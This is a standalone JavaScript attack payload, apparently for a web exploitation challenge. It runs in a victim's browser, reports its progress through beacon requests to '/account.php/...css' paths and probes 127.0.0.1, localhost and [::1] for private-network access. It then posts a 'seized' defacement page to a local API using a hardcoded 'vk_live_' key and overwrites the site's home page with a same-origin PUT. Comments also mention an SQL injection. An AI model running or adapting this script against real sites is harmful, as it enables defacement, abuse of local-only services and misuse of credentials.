(async () => {
  const T = "VTG921";
  const K = "vk_live_daf5f1744a7bfbbeefe31e1544ca1d4ee214";
  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css',{credentials:'include',cache:'no-store'}); } catch(e){} };
  const chk = async () => { try { return (await (await fetch('/?_nc='+Date.now(),{cache:'no-store'})).text()).includes('CT-CASE'); } catch(e){ return false; } };

  await bc('A');

  // Test 1: PNA diagnostic - simple GET to 127.0.0.1 with no-cors
  const pnaTest = await Promise.allSettled([
    fetch('http://127.0.0.1/', {mode:'no-cors', cache:'no-store'}),
    fetch('http://127.0.0.1/', {cache:'no-store'}),
    fetch('http://localhost/', {mode:'no-cors', cache:'no-store'}),
    fetch('http://[::1]/', {mode:'no-cors', cache:'no-store'}),
  ]);

  for (let i = 0; i < pnaTest.length; i++) {
    const r = pnaTest[i];
    if (r.status === 'fulfilled') {
      await bc('PNA_OK_'+i+'_TYPE_'+r.value.type+'_STATUS_'+r.value.status);
    } else {
      const msg = r.reason ? String(r.reason).substring(0,20).replace(/[^a-zA-Z0-9]/g,'_') : 'unknown';
      await bc('PNA_FAIL_'+i+'_'+msg);
    }
  }

  if (await chk()) { await bc('WIN_EARLY'); return; }

  // Test 2: Read current page via XHR (same-origin) to check if write happened
  // Also check XHR to 127.0.0.1 with different approach
  const xhrTest = (url, method, body) => new Promise((res) => {
    const x = new XMLHttpRequest();
    x.open(method, url, true);
    if (body) x.setRequestHeader('Content-Type', 'application/json');
    x.onreadystatechange = () => { if (x.readyState===4) res({s: x.status, r: x.responseText.substring(0,50)}); };
    x.onerror = () => res({s: 0, r: 'error'});
    x.ontimeout = () => res({s: -1, r: 'timeout'});
    x.timeout = 5000;
    try { x.send(body); } catch(e) { res({s: -2, r: String(e).substring(0,20)}); }
  });

  // XHR test to 127.0.0.1 with text/plain (simple request, should bypass CORS preflight)
  const x1 = await xhrTest('http://127.0.0.1/api/pages/home?api_key='+K, 'POST', null);
  await bc('XGET_'+x1.s);

  // XHR POST with body (text/plain = simple, no preflight)
  const SEIZED_TINY = '<!doctype html><html><!-- CT-CASE --><body>seized</body></html>';
  const x2 = await xhrTest('http://127.0.0.1/api/pages/home?api_key='+K, 'POST', SEIZED_TINY);
  await bc('XPOST_'+x2.s);

  if (await chk()) { await bc('WIN_POST'); return; }

  // Test 3: What does REMOTE_ADDR look like for same-origin requests?
  // Use the SQLi to INSERT a beacon with timestamp after a same-origin request
  // Then check via SQLi what REMOTE_ADDR was
  // This can be done indirectly: make a same-origin request that includes REMOTE_ADDR in response headers
  // Actually, let's see if the API echoes REMOTE_ADDR anywhere
  const soResp = await fetch('/api/pages/home?api_key='+K, {
    method: 'PUT',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({body: SEIZED_TINY}),
    credentials: 'include',
    cache: 'no-store'
  });
  const soBody = await soResp.text();
  // Check if soBody is the CT-CASE page or the original
  const isCTCase = soBody.includes('CT-CASE');
  const isJSON = soBody.startsWith('{');
  await bc('SO_' + (isCTCase ? 'WIN' : (isJSON ? 'JSON' : 'PAGE')));

  if (isCTCase) { await bc('WIN_SO'); return; }

  // Test 4: Try reading response headers from same-origin PUT
  // If PHP adds a special header with REMOTE_ADDR info...
  const headers = {};
  soResp.headers.forEach((v, k) => { headers[k] = v; });
  const remoteAddrHeader = soResp.headers.get('x-remote-addr') || soResp.headers.get('x-debug-ip') || '';
  if (remoteAddrHeader) {
    const ipBeacon = remoteAddrHeader.replace(/[^a-zA-Z0-9.]/g, '_').substring(0, 30);
    await bc('REMOTE_'+ipBeacon);
  }

  await bc('DONE');
})();
